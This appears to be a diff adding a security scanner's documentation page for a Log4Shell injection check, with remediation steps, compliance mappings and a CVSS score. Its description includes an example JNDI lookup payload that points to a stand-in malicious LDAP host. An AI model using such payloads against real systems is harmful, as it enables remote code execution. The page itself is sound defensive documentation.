@@ -1,0 +1,85 @@
+---
+title: Log4Shell
+---
+
+# Log4Shell
+
+## Description
+
+Log4Shell is a vulnerability that allows attackers to execute arbitrary code by injecting untrusted data into log messages processed by the Log4j library.
+Example: `logger.error('${jndi:ldap://malicious.com/a}'')` could trigger the execution of code from a remote server.
+
+
+## Remediation
+
+To prevent Log4Shell vulnerabilities, take the following actions:
+- Update Log4j to the latest version, where this vulnerability is patched.
+- Use input validation and sanitization to ensure that user inputs are not directly used in log messages.
+- Disable the `jndi` lookups in Log4j by setting the system property `log4j2.formatMsgNoLookups` to `true`.
+- Restrict outbound network access from the servers running your applications to prevent JNDI lookups from reaching untrusted servers.
+- Implement application-level security controls and monitor for unusual log patterns that may indicate attempted exploits.
+
+
+
+### REST Specific
+
+<details>
+    <summary>Spring_boot</summary>
+
+Update Log4j to version 2.15.0 or later to mitigate the Log4Shell vulnerability. Ensure that log messages do not include untrusted data without proper validation and sanitization. Disable `jndi` lookups by setting the `log4j2.formatMsgNoLookups` system property to `true`. Regularly review and monitor logs for suspicious activities.
+
+</details>
+
+## Configuration
+
+> Identifier: `injection/log4shel`
+
+
+
+### Examples
+
+
+
+#### Ignore this check
+
+```yaml
+checks:
+  injection/log4shel:
+    skip: true
+```
+
+
+
+
+## Score
+
+- Escape Severity: **<span className="high-severity">HIGH</span>**
+
+### Compliance
+
+- OWASP: **[API8:2023](https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md)**
+- pci: **6.5.10**
+- gdpr: **Article-32**
+- soc2: **CC6**
+- psd2: **Article-97**
+- iso27001: **A.14.2**
+- nist: **SP800-53**
+- fedramp: **SI-10**
+
+### Classification
+
+
+
+
+
+
+### Score
+
+- CVSS_VECTOR: **CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C**
+- CVSS_SCORE: **9.8**
+
+## References
+
+- [https://cwe.mitre.org/data/definitions/829.html](https://cwe.mitre.org/data/definitions/829.html)
+  - [https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)
+  
